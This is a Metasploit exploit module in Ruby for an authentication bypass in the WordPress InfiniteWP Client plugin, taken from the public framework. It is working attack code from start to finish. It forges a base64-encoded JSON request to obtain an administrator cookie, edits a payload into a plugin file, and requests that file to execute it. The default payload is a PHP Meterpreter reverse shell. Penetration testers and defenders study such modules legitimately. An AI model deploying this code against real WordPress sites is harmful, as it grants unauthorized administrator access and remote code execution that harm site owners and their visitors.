##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress InfiniteWP Client Authentication Bypass',
      'Description'    => %q{
        This module exploits an authentication bypass in the WordPress
        InfiniteWP Client plugin to log in as an administrator and execute
        arbitrary PHP code. A valid administrator username is required.
      },
      'Author'         => [
        'WebARX', # Discovery
        'wvu'     # Module
      ],
      'References'     => [
        ['WPVDB', '10011'],
        ['URL', 'https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/'],
        ['URL', 'https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/'],
        ['URL', 'https://blog.sucuri.net/2020/01/authentication-bypass-vulnerability-in-infinitewp-client.html']
      ],
      'DisclosureDate' => '2020-01-14',
      'License'        => MSF_LICENSE,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Privileged'     => false,
      'Targets'        => [['InfiniteWP Client < 1.9.4.5', {}]],
      'DefaultTarget'  => 0,
      'DefaultOptions' => {'PAYLOAD' => 'php/meterpreter/reverse_tcp'}
    ))

    register_options([
      OptString.new('USERNAME',    [true, 'WordPress username', 'admin']),
      OptString.new('PLUGIN_FILE', [true, 'Plugin file to edit', 'index.php'])
    ])

    register_advanced_options([
      OptBool.new('ForceExploit', [false, 'Override check result', false])
    ])
  end

  def username
    datastore['USERNAME']
  end

  def plugin_file
    datastore['PLUGIN_FILE']
  end

  def plugin_uri
    normalize_uri(wordpress_url_plugins, plugin_file)
  end

  def check
    unless wordpress_and_online?
      return CheckCode::Safe('Is the site online and running WordPress?')
    end

    check_version_from_custom_file(
      normalize_uri(wordpress_url_plugins, '/iwp-client/readme.txt'),
      /^= ([\d.]+)/,
      '1.9.4.5'
    )
  end

  # https://plugins.trac.wordpress.org/browser/iwp-client/tags/1.9.4.4/init.php
  def auth_bypass
    json = {
      'iwp_action' => %w[add_site readd_site].sample,
      'params'     => {'username' => username}
    }.to_json

    res = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path),
      'data'   => "_IWP_JSON_PREFIX_#{Rex::Text.encode_base64(json)}"
    )

    return unless res && res.code == 200 && (cookie = res.get_cookies)

    cookie
  end

  def exploit
    unless datastore['ForceExploit']
      if check == CheckCode::Safe
        fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')
      end
    end

    print_status("Bypassing auth for #{username} at #{full_uri}")
    unless (cookie = auth_bypass)
      fail_with(Failure::NoAccess, "Could not obtain cookie for #{username}")
    end

    print_good("Successfully obtained cookie for #{username}")
    vprint_status("Cookie: #{cookie}")

    print_status("Editing payload into #{plugin_uri}")
    unless wordpress_edit_plugin(plugin_file, payload.encoded, cookie)
      fail_with(Failure::UnexpectedReply, "Could not edit #{plugin_uri}")
    end

    print_good("Successfully edited payload into #{plugin_uri}")

    print_status("Requesting payload at #{plugin_uri}")
    send_request_cgi({
      'method' => 'GET',
      'uri'    => plugin_uri
    }, 0)
  end

end
